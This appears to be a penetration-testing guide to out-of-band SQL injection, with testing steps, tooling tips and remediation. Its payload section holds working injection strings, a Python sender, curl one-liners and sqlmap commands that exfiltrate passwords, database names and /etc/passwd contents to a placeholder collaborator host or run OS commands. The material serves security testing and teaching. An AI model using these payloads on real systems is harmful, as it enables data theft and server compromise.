# SQL Injection Out-of-Band

## Overview
Out-of-band (OOB) SQL injection extracts data via a separate network channel — typically DNS lookups or HTTP requests — rather than through the application's HTTP response. This technique is used when both boolean and time-based blind methods are unreliable (due to heavy caching, asynchronous processing, or network instability), and the database server has outbound network access. OOB SQLi is the most powerful exfiltration channel because it is often faster than time-based extraction and bypasses many application-level response checks.

## How It Works
- The attacker injects a payload that triggers the database server to make a DNS lookup or HTTP request to an attacker-controlled server.
- MySQL uses `LOAD_FILE` with a UNC path or `SELECT INTO OUTFILE` to trigger DNS resolution.
- MSSQL uses `xp_cmdshell`, `xp_dirtree`, or `OpenRowSet` to trigger outbound connections.
- Oracle uses `UTL_HTTP.request` or `UTL_FILE` for outbound HTTP/DNS.
- PostgreSQL uses `COPY TO PROGRAM` or `dblink` for outbound connectivity.
- The exfiltrated data is encoded in the DNS hostname (e.g., `admin-password-hash.attacker.com`) so the attacker's DNS server logs the query and reveals the data.
- Burp Collaborator provides an automated DNS/HTTP receiver for OOB testing.

## Impact
- Full database extraction via DNS or HTTP — even when the application itself provides no feedback.
- Bypasses WAFs that inspect HTTP responses but not outbound network traffic.
- Can confirm SQLi in completely headless/API-only backends.
- Works even when the application response is identical for all inputs.
- Potential for SSRF if the database server can reach internal services.

## Where to Look
- Same injection points as other SQLi — all user-controlled parameters.
- Particularly useful when: error messages are suppressed, responses are identical, caching is aggressive.
- Applications that process requests asynchronously (batch processors, data pipelines).
- Reporting/export functionality that processes large queries in the background.
- Environments where the database server has unrestricted outbound internet access.

## Testing Steps
1. Identify an injection point where standard techniques are inconclusive.
2. Start a Burp Collaborator session (Burp > Burp Collaborator client > Copy to clipboard).
3. Inject a DNS-triggering payload using your Collaborator domain.
4. Monitor the Collaborator client for incoming DNS interactions.
5. If a DNS interaction is received — OOB SQLi is confirmed.
6. Upgrade to data exfiltration payloads that encode query output in the DNS subdomain.
7. For MSSQL: test `xp_dirtree` and `xp_cmdshell` (latter requires `sa` or `sysadmin` privileges).
8. For MySQL: test `LOAD_FILE` with UNC paths (Windows MySQL servers only for DNS; Linux needs `SELECT INTO OUTFILE`).
9. Confirm database user privileges: `SELECT user()`, `SELECT SYSTEM_USER()`, `IS_SYSADMIN()`.
10. Report with Collaborator interaction evidence and extracted data samples.

## Payloads / Techniques

```sql
-- MSSQL: DNS lookup via xp_dirtree (most reliable)
-- Requires public access to Burp Collaborator or self-hosted DNS
'; EXEC xp_dirtree '//YOUR_COLLABORATOR_DOMAIN/a'--
'; EXEC xp_dirtree '//'+((SELECT TOP 1 db_name()))+'.YOUR_COLLABORATOR_DOMAIN/a'--

-- MSSQL: DNS exfiltration with data
'; EXEC xp_dirtree '//'+(SELECT TOP 1 MASTER..fn_varbintohexstr(HASHBYTES('MD5',password)) FROM users)+'.YOUR_COLLABORATOR_DOMAIN/a'--

-- MSSQL: xp_cmdshell (requires sysadmin)
'; EXEC xp_cmdshell 'nslookup YOUR_COLLABORATOR_DOMAIN'--
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://YOUR_COLLABORATOR_DOMAIN/?data=$($env:USERDOMAIN)"'--

-- MSSQL: OpenRowSet (data exfil via HTTP)
'; DECLARE @data VARCHAR(MAX); SET @data=(SELECT TOP 1 password FROM users); EXEC('xp_dirtree ''//'+@data+'.YOUR_COLLABORATOR_DOMAIN/a''')--

-- MySQL: DNS lookup via LOAD_FILE (Windows only, requires FILE priv)
' AND LOAD_FILE(CONCAT('\\\\',database(),'.YOUR_COLLABORATOR_DOMAIN\\a'))--
' AND LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT hex(password) FROM users LIMIT 1),0x2e,'YOUR_COLLABORATOR_DOMAIN',0x5c5c61))--

-- MySQL: OOB via UDF or sys_exec if available
' UNION SELECT sys_eval('curl http://YOUR_COLLABORATOR_DOMAIN/?d=$(cat /etc/passwd | base64)')-- 

-- Oracle: UTL_HTTP
' || UTL_HTTP.request('http://YOUR_COLLABORATOR_DOMAIN/?data='||(SELECT username FROM all_users WHERE ROWNUM=1))--
' || (SELECT UTL_HTTP.request('http://YOUR_COLLABORATOR_DOMAIN/'||password) FROM users WHERE username='admin')--

-- Oracle: UTL_FILE and DNS
' || (SELECT UTL_INADDR.get_host_address((SELECT username FROM all_users WHERE ROWNUM=1)||'.YOUR_COLLABORATOR_DOMAIN') FROM dual)--

-- PostgreSQL: DNS via COPY
'; COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'curl http://YOUR_COLLABORATOR_DOMAIN/?d='--
'; CREATE TEMP TABLE t AS SELECT version(); COPY t TO PROGRAM 'curl --data @- http://YOUR_COLLABORATOR_DOMAIN/'--
```

```python
# OOB injection test with Burp Collaborator interaction check
# Burp Collaborator must be running or use interactsh

import requests

COLLABORATOR = "abc123def.burpcollaborator.net"  # Your Collaborator domain
TARGET = "https://target.com/item"

payloads = {
    "mssql_dns": f"'; EXEC xp_dirtree '//{COLLABORATOR}/a'--",
    "mysql_dns": f"' AND LOAD_FILE(CONCAT(0x5c5c5c5c,'{COLLABORATOR}',0x5c5c61))--",
    "oracle_http": f"' || UTL_HTTP.request('http://{COLLABORATOR}/') FROM dual--",
    "pgsql_dns": f"'; COPY (SELECT 1) TO PROGRAM 'nslookup {COLLABORATOR}'--",
}

for db_type, payload in payloads.items():
    r = requests.get(TARGET, params={"id": payload})
    print(f"[*] Sent {db_type} OOB payload: HTTP {r.status_code}")
    print(f"    Check Collaborator for DNS/HTTP interactions from: {COLLABORATOR}")
```

```bash
# Using interactsh (open-source Collaborator alternative)
# Install: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client -v

# Use the generated URL in payloads
INTERACT_URL="abc123.oast.pro"

# Test MSSQL OOB
curl -si "https://target.com/item?id=1%3B+EXEC+xp_dirtree+%27%2F%2F${INTERACT_URL}%2Fa%27--"

# Test MySQL OOB with data
curl -si "https://target.com/item?id=1'+AND+LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT+hex(database())),0x2e,'${INTERACT_URL}',0x5c5c61))--"
```

```bash
# sqlmap OOB (-technique=O)
sqlmap -u "https://target.com/item?id=1" \
  --technique=O \
  --dns-domain=YOUR_COLLABORATOR_DOMAIN \
  --dbs \
  --batch

# MSSQL with xp_cmdshell
sqlmap -u "https://target.com/item?id=1" \
  --technique=O \
  --dbms=mssql \
  --os-cmd="whoami" \
  --batch
```

## Burp Suite Tips
- **Burp Collaborator**: The go-to tool for OOB testing. Open Collaborator client from the Burp menu, copy the payload domain, inject it into SQL payloads, then click "Poll now" to check for DNS/HTTP interactions. Each interaction shows the full request, including any data encoded in the subdomain.
- **Active Scanner with Collaborator**: Burp's active scanner automatically uses Collaborator payloads for OOB SQLi detection — let the scanner run and check Collaborator for interactions.
- **OAST (Out-of-Band Application Security Testing)**: Enable OAST in Burp's scan configuration to ensure OOB payloads are included in all active scans.
- **DNS Interaction Details**: When reviewing Collaborator interactions for data exfiltration, look at the subdomain portion of DNS queries — data is often hex-encoded in the subdomain label.
- **Repeater**: Manually craft and send OOB payloads in Repeater while monitoring Collaborator simultaneously for real-time feedback.

## Tools
- **Burp Suite + Collaborator** — OOB DNS/HTTP interaction receiver for testing.
- **interactsh** (ProjectDiscovery) — open-source Collaborator alternative: https://github.com/projectdiscovery/interactsh
- **sqlmap** — `--technique=O --dns-domain=` for automated OOB extraction.
- **Responder** — capture DNS/LLMNR queries on local networks.
- **nslookup / dig** — manually verify DNS resolution of Collaborator domains.
- **DNSBin / Canarytokens** — hosted DNS logging services for OOB detection.

## Remediation
- Parameterized queries prevent SQL injection regardless of technique.
- Restrict database server outbound network access via firewall rules — block all outbound DNS and HTTP from the database server (principle of least privilege for network).
- Disable `xp_cmdshell`, `xp_dirtree`, `LOAD_FILE`, `UTL_HTTP`, and similar privileged functions unless absolutely necessary.
- Run database processes with a low-privileged OS account — minimize blast radius of OOB RCE.
- Monitor DNS traffic from database servers for anomalous external lookups.
- Network segmentation: database servers should not have direct internet access.

## References
https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-using-out-of-band-techniques
https://portswigger.net/burp/documentation/collaborator
https://owasp.org/www-community/attacks/SQL_Injection
https://github.com/sqlmapproject/sqlmap
https://cwe.mitre.org/data/definitions/89.html
https://github.com/projectdiscovery/interactsh
